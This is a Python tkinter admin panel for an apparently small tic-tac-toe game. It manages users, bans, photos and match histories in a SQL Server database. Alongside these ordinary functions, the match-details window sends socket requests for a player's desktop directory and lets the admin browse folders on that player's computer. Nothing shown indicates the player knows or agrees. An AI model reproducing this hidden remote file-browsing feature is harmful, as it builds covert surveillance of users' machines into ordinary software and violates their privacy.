import tkinter as tk
from tkinter import ttk, messagebox
import pyodbc
import os
import sys
import socket
import threading
from cryptography.fernet import Fernet

root_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if root_path not in sys.path: sys.path.append(root_path)

try:
    import config
except ImportError:
    messagebox.showerror("Error", "Could not find config.py")
    sys.exit()

cipher = Fernet(config.FERNET_KEY)
DB_CONF = 'DRIVER={ODBC Driver 17 for SQL Server};SERVER=DESKTOP-DOGCDD4\\SQLEXPRESS;DATABASE=AuthSystemDB;Trusted_Connection=yes'

class AdminPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("ADMIN PANEL")
        self.root.geometry("650x600")
        self.root.configure(bg="#2b2b2b")
        
        self.active_lb = None
        self.active_login = None
        self.current_path = ""
        self.parent_path = ""

        self.admin_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.admin_sock.connect((config.HOST, config.PORT))
            self.send_sock("ADMIN_AUTH|1")
            threading.Thread(target=self.listen_server, daemon=True).start()
        except Exception as e:
            print("Warning: Server offline, Live browser disabled.", e)

        self.setup_ui()
        self.load_users()

    def send_sock(self, msg):
        try:
            self.admin_sock.send((cipher.encrypt(msg.encode()).decode() + "\n").encode())
        except: pass

    def listen_server(self):
        buffer = ""
        while True:
            try:
                data = self.admin_sock.recv(16384).decode()
                if not data: break
                buffer += data
                while "\n" in buffer:
                    raw, buffer = buffer.split("\n", 1)
                    msg = cipher.decrypt(raw.encode()).decode()
                    if msg.startswith("DIR_RES|"):
                        parts = msg.split("|", 4)
                        if len(parts) == 5:
                            _, t_log, t_path, t_parent, items = parts
                            if self.active_lb and self.active_login == t_log:
                                self.root.after(0, self.update_file_list, t_path, t_parent, items)
            except: break

    def update_file_list(self, path, parent, items_str):
        self.current_path = path
        self.parent_path = parent
        self.active_lb.delete(0, "end")
        self.active_lb.insert("end","[PRESS TO GO UP]")
        
        if items_str.startswith("ERROR"):
            self.active_lb.insert("end", items_str)
        elif items_str:
            for item in items_str.split("<|>"):
                self.active_lb.insert("end", item)

    def setup_ui(self):
        self.search_var = tk.StringVar()
        search_frame = tk.Frame(self.root, bg="#2b2b2b")
        search_frame.pack(fill="x", padx=10, pady=(10, 0))
        tk.Label(search_frame, text="Search by Login:", bg="#2b2b2b", fg="white").pack(side="left")
        search_entry = tk.Entry(search_frame, textvariable=self.search_var, width=67)
        search_entry.pack(side="left", padx=10)
        search_entry.bind("<Return>", lambda e: self.perform_search())
        tk.Button(search_frame, text="Find", bg="#000956", fg="white", width=7, command=self.perform_search).pack(side="left")

        btn_frame = tk.Frame(self.root, bg="#2b2b2b")
        btn_frame.pack(fill="x", padx=10, pady=10)
        tk.Button(btn_frame, text="Refresh", bg="#1D5300", fg="white", width=12, command=self.refresh_users).pack(side="left", padx=5)
        tk.Button(btn_frame, text="BAN/UNBAN", bg="#530041", fg="white", width=12, command=self.toggle_ban).pack(side="left", padx=5)
        tk.Button(btn_frame, text="Delete User", bg="#8b0000", fg="white", width=12, command=self.delete_user).pack(side="left", padx=5)
        tk.Button(btn_frame, text="Clear Photo", bg="#b8860b", fg="white", width=12, command=self.clear_photo).pack(side="left", padx=5)

        style = ttk.Style(); style.theme_use("clam")
        style.configure("Treeview", background="#d3d3d3", foreground="black", rowheight=25, fieldbackground="#d3d3d3")
        style.map('Treeview', background=[('selected', '#347083')])

        self.tree = ttk.Treeview(self.root, columns=("login", "photo", "status"), show="headings", height=10)
        self.tree.heading("login", text="Login (Email)")
        self.tree.heading("photo", text="Photo Status")
        self.tree.heading("status", text="Access Status")
        self.tree.column("login", width=200)
        self.tree.column("photo", width=100, anchor="center")
        self.tree.column("status", width=120, anchor="center")
        self.tree.pack(fill="x", padx=10, pady=(0, 10))
        self.tree.bind("<<TreeviewSelect>>", self.on_user_select)

        tk.Label(self.root, text="Match History (Double-click to view details):", bg="#2b2b2b", fg="white").pack(anchor="w", padx=10)
        self.history_tree = ttk.Treeview(self.root, columns=("id", "date", "opponent", "result"), show="headings", height=8)
        self.history_tree.heading("id", text="ID")
        self.history_tree.heading("date", text="Date")
        self.history_tree.heading("opponent", text="Opponent")
        self.history_tree.heading("result", text="Result")
        self.history_tree.column("id", width=50, anchor="center")
        self.history_tree.column("date", width=150, anchor="center")
        self.history_tree.column("opponent", width=150, anchor="center")
        self.history_tree.column("result", width=100, anchor="center")
        self.history_tree.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        self.history_tree.bind("<Double-1>", self.show_match_details)

    def get_conn(self): return pyodbc.connect(DB_CONF)

    def on_user_select(self, event):
        for item in self.history_tree.get_children(): self.history_tree.delete(item)
        selected = self.tree.selection()
        if not selected: return
        login = self.tree.item(selected[0])['values'][0]
        try:
            with self.get_conn() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT Id, MatchDate, Player1, Player2, Result FROM Matches WHERE Player1=? OR Player2=? ORDER BY Id DESC", (login, login))
                for row in cursor.fetchall():
                    m_id, m_date, p1, p2, result = row
                    opponent = p2 if p1 == login else p1
                    user_result = "Draw" if result == "DRAW" else ("WIN" if result == login else "LOSS")
                    date_str = str(m_date).split('.')[0] if m_date else "N/A"
                    self.history_tree.insert("", "end", values=(m_id, date_str, opponent, user_result))
        except: pass 

    def on_file_click(self, event):
        if not self.active_lb: return
        sel = self.active_lb.curselection()
        if not sel: return
        item = self.active_lb.get(sel[0])

        if item == "[PRESS TO GO UP]":
            self.send_sock(f"DIR_REQ|{self.active_login}|{self.parent_path}")
        elif item.startswith("[DIR] "):
            folder = item[6:]
            new_path = self.current_path + "/" + folder
            self.send_sock(f"DIR_REQ|{self.active_login}|{new_path}")

    def show_match_details(self, event):
        selected_match = self.history_tree.selection()
        if not selected_match: return
        
        m_id = self.history_tree.item(selected_match[0])['values'][0]
        opponent_login = self.history_tree.item(selected_match[0])['values'][2]
        self.active_login = opponent_login

        try:
            with self.get_conn() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT Player1, Player2, MoveHistory FROM Matches WHERE Id=?", (m_id,))
                match_data = cursor.fetchone()
                cursor.execute("SELECT Result FROM Matches WHERE Player1=? OR Player2=?", (opponent_login, opponent_login))
                opp_matches = cursor.fetchall()
                
                total_games = len(opp_matches)
                wins = sum(1 for row in opp_matches if row[0] == opponent_login)
                draws = sum(1 for row in opp_matches if row[0] == "DRAW")
                losses = total_games - wins - draws
        except: return

        detail_win = tk.Toplevel(self.root)
        detail_win.title(f"Live Data: {opponent_login}")
        detail_win.geometry("600x600")
        detail_win.configure(bg="#000956")

        stat_frame = tk.LabelFrame(detail_win, text=f" OPPONENT STATUS: {opponent_login} ", bg="#000956", fg="white")
        stat_frame.pack(fill="x", padx=10, pady=10)
        tk.Label(stat_frame, text=f"Total Games: {total_games} | Wins: {wins} | Losses: {losses}", bg="#000956", fg="white").pack(anchor="w", padx=10, pady=5)

        move_frame = tk.LabelFrame(detail_win, text=" MOVE RECORDS ", bg="#000956", fg="white")
        move_frame.pack(fill="x", padx=10, pady=(0, 10))
        text_area = tk.Text(move_frame, bg="#000956", fg="white", font=("Consolas", 10), state="normal", width=40, height=8)
        text_area.pack(padx=5, pady=5, fill="x")

        if match_data and match_data[2]:
            p1, p2, moves_str = match_data
            pos_map = {0:"Top-L", 1:"Top-C", 2:"Top-R", 3:"Mid-L", 4:"Center", 5:"Mid-R", 6:"Bot-L", 7:"Bot-C", 8:"Bot-R"}
            text_area.insert("end", f"X: {p1} | O: {p2}\n" + "-------------------------" + "\n")
            for i, move_idx in enumerate(moves_str.split(',')):
                if not move_idx: continue
                text_area.insert("end", f"Move {i+1}: {'X' if i%2==0 else 'O'} -> {pos_map.get(int(move_idx), '?')}\n")
        text_area.configure(state="disabled")

        desktop_frame = tk.LabelFrame(detail_win, text=" CLIENT DESKTOP FILES ", bg="#000956", fg="white")
        desktop_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        scrollbar = ttk.Scrollbar(desktop_frame)
        scrollbar.pack(side="right", fill="y")
        
        self.active_lb = tk.Listbox(desktop_frame, bg="#000956", fg="white", font=("Consolas", 9), yscrollcommand=scrollbar.set)
        self.active_lb.pack(fill="both", expand=True, padx=5, pady=5)
        scrollbar.config(command=self.active_lb.yview)
        
        self.active_lb.bind("<Double-1>", self.on_file_click)

        self.active_lb.insert("end", "Sending live request to client . . .")
        self.send_sock(f"DIR_REQ|{opponent_login}|DESKTOP")

    def load_users(self, search_query=""):
        for item in self.tree.get_children(): self.tree.delete(item)
        for item in self.history_tree.get_children(): self.history_tree.delete(item)
        try:
            with self.get_conn() as conn:
                cursor = conn.cursor()
                if search_query: cursor.execute("SELECT Login, Photo, Banned FROM Users WHERE Login LIKE ?", (f"%{search_query}%",))
                else: cursor.execute("SELECT Login, Photo, Banned FROM Users")
                for login, photo, banned in cursor.fetchall():
                    self.tree.insert("", "end", values=(login, "OK :)" if photo else "NO :(", "BANNED >:(" if banned else "Active :)"))
        except: pass

    def perform_search(self): self.load_users(self.search_var.get().strip())
    def refresh_users(self): self.search_var.set(""); self.load_users()

    def get_selected_login(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showwarning("ERR . . .", "Select user first.")
            return None
        return self.tree.item(sel[0])['values'][0]

    def toggle_ban(self):
        login = self.get_selected_login()
        if not login: return
        try:
            with self.get_conn() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT Banned FROM Users WHERE Login=?", (login,))
                current = cursor.fetchone()[0]
                cursor.execute("UPDATE Users SET Banned=? WHERE Login=?", (int(not current), login))
                conn.commit()
            self.perform_search()

        except:
            pass

    def delete_user(self):
        login = self.get_selected_login()
        if login and messagebox.askyesno("Confirm", f"Delete {login} FOREVER?"):
            try:
                with self.get_conn() as conn: conn.cursor().execute("DELETE FROM Users WHERE Login=?", (login,)); conn.commit()
                self.perform_search()
            except: pass

    def clear_photo(self):
        login = self.get_selected_login()
        if login:
            try:
                with self.get_conn() as conn: conn.cursor().execute("UPDATE Users SET Photo=NULL WHERE Login=?", (login,)); conn.commit()
                self.perform_search()
            except: pass

if __name__ == "__main__":
    root = tk.Tk()
    app = AdminPanel(root)
    root.mainloop()